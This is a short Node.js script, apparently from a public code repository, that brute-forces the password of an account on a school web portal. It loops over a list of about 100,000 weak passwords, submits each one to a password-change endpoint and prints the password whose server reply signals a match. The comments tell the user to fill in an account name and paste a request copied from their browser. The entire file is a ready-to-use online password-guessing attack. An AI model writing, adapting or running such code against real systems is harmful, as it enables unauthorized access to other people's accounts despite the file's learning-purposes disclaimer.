//The Software is provided for development and learning purposes only. The Author expressly disclaims any liability for any claim arising from the use or distribution of the Software. Users are solely responsible for ensuring that their use of the Software complies with all applicable laws and regulations.
//Copyright ©2024 JasonL111
//This product is under Apache2 license
// Use ES Module to import
import fetch from 'node-fetch';
import fs from 'fs/promises';

async function tryPasswords() {
    try {
        //This weak password set include about 100k password.
        //If your think your weak password set is better, just change it, remember to put it in the same directory.
        const text = await fs.readFile('passwords.txt', 'utf8');
        const passwords = text.split('\n');

        for (let i = 0; i < passwords.length; i++) {
            let password = passwords[i].trim();
            //you need to input your account here
            let account=""
            let body = `user_name=${account}&old_password=${password}&new_password=${password}&re_password=${password}`;
            //This part need to be modified to work let account="" in your school 
            //from here
            try {
                //here to paste if you use the first way
                let fetchResponse = await fetch("", {
                    
                    "headers": {
                        "accept": "application/json, text/javascript, */*; q=0.01",
                        "accept-language": "en",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "x-requested-with": "XMLHttpRequest"
                    },
                    "body": body,
                    "method": "POST",
                });
                //to there. You can copy the request easily in your browser, copy in the JS(node.js) form.
                let responseData = await fetchResponse.json();
                if (responseData.message === "请求未授权") {
                    console.log("正确密码:", password);
                    break;}
                else{
                    console.log("wrong")
                
                }
                
            } catch (error) {
                console.error("Error during fetch:", error);
            }
        }
    } catch (error) {
        console.error("Error reading the file:", error);
    }
}

tryPasswords();
